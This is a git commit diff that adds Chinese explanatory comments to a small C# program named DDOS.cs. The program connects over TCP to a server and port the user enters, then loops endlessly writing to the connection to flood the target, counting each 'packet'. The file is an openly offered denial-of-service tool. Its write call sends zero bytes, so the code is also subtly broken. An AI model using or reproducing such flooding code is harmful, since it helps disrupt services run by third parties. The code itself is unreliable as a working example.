17f12d1d5b2f84b9c6115c2acf6d1da9b6b82f62
YFBdev <140477055+YFBdev@users.noreply.github.com>
2023-12-31 13:59:05 +0800

    添加注释,方便阅读

--- DDOS.cs
+++ DDOS.cs
@@ -4,46 +4,46 @@ using System.Net.Sockets;
 
 class Program {
     static void Main() {
-        Console.Write("服务器    |  Server: ");
+        Console.Write("服务器    |  Server: ");//要求输入服务寄地址
         string serverIP = Console.ReadLine();
         int serverPort;
-        while (true) {
+        while (true) {//要求输入端口,并检测
             Console.Write("端口      |  Port  : ");
             string inputPort = Console.ReadLine();
             if (int.TryParse(inputPort, out serverPort)) {
                 try {
                     TcpClient client = new TcpClient();
-                    client.Connect(serverIP, serverPort);
+                    client.Connect(serverIP, serverPort);//以上两行都是连接服务器(connect方式)
                     Console.WriteLine("服务器连接成功  |  Connect success.");
                     try {
-                        NetworkStream stream = client.GetStream();
+                        NetworkStream stream = client.GetStream();//连接服务寄(client方式)
                         Console.WriteLine("正在连接服务器  |  Client server.");
                         byte[] buffer = System.Text.Encoding.ASCII.GetBytes("DataDataDataDataDataData");
                         int count = 0;
-                        while (true) {
+                        while (true) {//开始发包
                             count++;
                             try {
                                 stream.Write(buffer, 0, 0);
                                 Console.WriteLine("发了第" + count + "次包");
-                            } catch (Exception e) {
+                            } catch (Exception e) {//处理错误
                                 Console.ForegroundColor = ConsoleColor.Red;
                                 Console.WriteLine("在发送第" + count + "时发送问题" + e.Message);
                                 Console.ResetColor();
                                 continue;
                             }
                         }
-                    } catch (Exception e) {
+                    } catch (Exception e) {//处理连接错误
                         Console.ForegroundColor = ConsoleColor.Red;
                         Console.WriteLine("连接失败.      |  Unable to client to server.");
                         Console.ResetColor();
                     }
-                } catch (Exception e) {
+                } catch (Exception e) {//还是处理连接错误
                     Console.ForegroundColor = ConsoleColor.Red;
                     Console.WriteLine("服务器连接失败  |  Unable to connect to server.");
                     Console.ResetColor();
                 }
                 break;
-            } else {
+            } else {//处理端口输入是否正确
                 Console.ForegroundColor = ConsoleColor.Red;
                 Console.WriteLine("端口不正确|  Invalid input");
                 Console.ResetColor();
@@ -51,3 +51,4 @@ class Program {
         }
     }
 }
+//综上所述,祝你生活愉快,再见～
